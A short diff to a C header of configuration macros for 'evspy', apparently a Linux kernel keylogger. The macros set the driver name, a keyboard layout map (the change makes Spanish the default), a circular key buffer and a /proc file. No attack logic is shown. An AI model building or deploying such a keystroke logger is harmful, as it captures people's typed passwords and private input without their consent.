@@ -4,6 +4,7 @@
 
 #define EVS_NAME		"evspy"				// driver name
 #define EVS_MAP			map_es				// change this to your keyboard layout
+#define EVS_KLAY		EVS_KLAY_ES			// change default layout to spanish
 #define EVS_TROLL		1					// clear this if you're a serious guy
 #define EVS_BUFSIZE		PAGE_SIZE			// size of the circular buffer (4K)
 #define EVS_PROCNAME	"driver/" EVS_NAME	// virtual file within /proc
